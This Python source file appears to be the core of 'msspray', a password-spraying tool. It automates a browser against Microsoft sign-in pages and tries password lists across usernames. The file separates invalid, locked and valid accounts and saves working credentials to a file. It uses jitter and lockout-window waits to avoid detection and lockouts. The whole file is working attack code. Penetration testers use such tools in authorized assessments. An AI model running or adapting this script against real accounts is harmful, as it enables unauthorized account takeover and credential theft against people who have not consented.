import argparse
import logging
import time
from datetime import datetime

from msspray.utils import (
    firefox,
    utils,
)
from msspray.utils.elements import Elements
from msspray.utils.logger import text_colors


def spray(args: argparse.Namespace):
    """Enumerate users

    :param args: arguments namespace
    """
    filename = f'spray_results.{datetime.utcnow().strftime("%Y%m%dT%H%M%Z")}.txt'
    logging.info(f"Writing spraying results to: {filename}")

    valid_creds = {}
    password_count = 0
    requests = 0

    browser = firefox.FirefoxEngine(wait=args.wait, proxy=args.proxy)

    for password in args.password:
        password_count += 1

        for username in args.username:
            logging.info(f"Trying credentials: {username}:{password}")

            requests += 1

            # This seems to helps with memory issues...
            browser.clear_cookies()

            # Reload the page for each username
            retries = 5
            while True:
                try:
                    browser.get(args.target)
                    break

                except firefox.WebDriverException as e:
                    if retries == 0:
                        logging.error(f"Firefox Engine Error: {e}")
                        exit(1)

                    retries -= 1

            try:
                # Populate the username field and click 'Next'
                browser.populate_element(
                    browser.find_element(
                        Elements.username.type, Elements.username.value
                    ),
                    username,
                )
                browser.click(
                    browser.is_clickable(Elements.next.type, Elements.next.value)
                )

                time.sleep(1)  # Ensure the previous DOM is stale

                # Handle invalid usernames
                if browser.find_element(
                    Elements.usererror.type, Elements.usererror.value
                ):
                    logging.info(
                        f"[{text_colors.FAIL}INVALID_USER{text_colors.ENDC}] "
                        f"{username}{' ' * 10}",
                        end="\r",
                    )
                    args.username.remove(username)

                else:

                    # Check if Microsoft prompts for work/personal account
                    if browser.find_element(Elements.work.type, Elements.work.value):
                        # Select Work
                        browser.execute_script(
                            'document.getElementById("aadTile").click()'
                        )
                        time.sleep(1)  # Ensure the previous DOM is stale

                    # Populate the password field and click 'Sign In'
                    browser.populate_element(
                        browser.find_element(
                            Elements.password.type, Elements.password.value
                        ),
                        password,
                    )
                    browser.click(
                        browser.is_clickable(Elements.login.type, Elements.login.value)
                    )

                    time.sleep(1)  # Ensure the previous DOM is stale

                    # Check if account is locked out
                    if browser.find_element(
                        Elements.locked.type, Elements.locked.value
                    ):
                        logging.info(
                            f"[{text_colors.FAIL}LOCKED{text_colors.ENDC}] {username}"
                        )
                        args.username.remove(username)

                    else:

                        # Check for invalid password or account lock outs
                        if not browser.find_element(
                            Elements.passerror.type, Elements.passerror.value
                        ):
                            logging.info(
                                f"[{text_colors.OKGREEN}VALID{text_colors.ENDC}] {username}:{password}"
                            )
                            utils.write_results(filename, username, password)

                            valid_creds[username] = password
                            args.username.remove(username)

                        else:
                            print(
                                f"[{text_colors.FAIL}INVALID{text_colors.ENDC}] "
                                f"{username}{' ' * 10}",
                                end="\r",
                            )

            except Exception as e:
                logging.error(f"Spray error: {e}")

            # Handle browser resets after every 5 username attempts
            # to deal with latency issues
            if requests == 5:
                browser = firefox.reset_browser(browser, args.wait, args.proxy)
                requests = 0

            # Sleep/Jitter to throttle subsequent request attempts
            if args.sleep:
                utils.jitter_sleep(args.sleep, args.jitter)

        # Wait for lockout period
        # Don't wait after last password
        if password_count >= args.count and password != args.password[-1]:
            utils.lockout_reset_wait(args.lockout)
            password_count = 0

    # Statistics
    print("\n")
    logging.info(f"Spray results saved to:      {filename}")
    logging.info(f"Number of valid credentials: {len(valid_creds)}")
